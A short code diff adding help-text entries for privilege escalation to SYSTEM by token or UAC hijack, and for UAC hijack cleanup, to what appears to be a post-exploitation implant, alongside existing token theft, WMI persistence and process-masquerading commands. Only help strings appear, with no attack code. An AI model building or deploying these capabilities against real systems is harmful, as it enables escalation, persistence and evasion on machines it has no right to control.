@@ -228,6 +228,8 @@ function printHelp() {
   writeLine('    make_token <u>|<p>|<d>    Create & impersonate token')
   writeLine('    steal_token <pid>         Steal & impersonate token')
   writeLine('    rev2self                  Revert to original token')
+  writeLine('    getsystem [token|uac]     Escalate to SYSTEM/elevated (spawns new session)')
+  writeLine('    getsystem uac_cleanup     Clean up leftover UAC hijack registry keys')
   writeLine('    ad_enum                   Active Directory enumeration')
   writeLine('    wmi_persist               WMI persistence install')
   writeLine('    hideprocess [on/off]      Masquerade process name (Linux)')
